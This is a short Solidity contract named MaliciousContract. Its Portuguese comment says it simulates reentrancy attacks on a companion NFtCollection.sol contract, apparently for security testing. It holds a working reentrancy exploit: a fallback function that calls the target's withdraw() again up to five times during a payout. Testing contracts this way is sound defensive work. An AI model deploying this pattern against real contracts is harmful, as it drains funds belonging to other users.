// SPDX-License-Identifier: SEE LICENSE IN LICENSE
pragma solidity 0.8.27;

import "./NFtCollection.sol";

/**
 * @title Malicious Smart Contract
 * @notice Este contrato simula ataques de reentrância ao contrato NFtCollection.sol
 * @author Cristofer Josuan 
 */
contract MaliciousContract {
    address public target;
    bool public attackOnGoing = false;
    uint public attackCounter;

    constructor(address _target) {
        target = _target;
        attackCounter = 0;
    }

    function attack() external payable {
        require(msg.value > 0, "Need to send some ether");
        
        attackOnGoing = true;
        (bool success, ) = target.call{value: msg.value}(abi.encodeWithSignature("withdraw()"));
        require(success, "Attack failed");
        
        attackOnGoing = false;
   }

   fallback() external payable {
    if (attackOnGoing && attackCounter < 5) {
        attackCounter++;
        (bool success, ) = target.call(abi.encodeWithSignature("withdraw()"));
        require(success, "Reentrancy attack failed");
    }
   }

    receive() external payable {}
}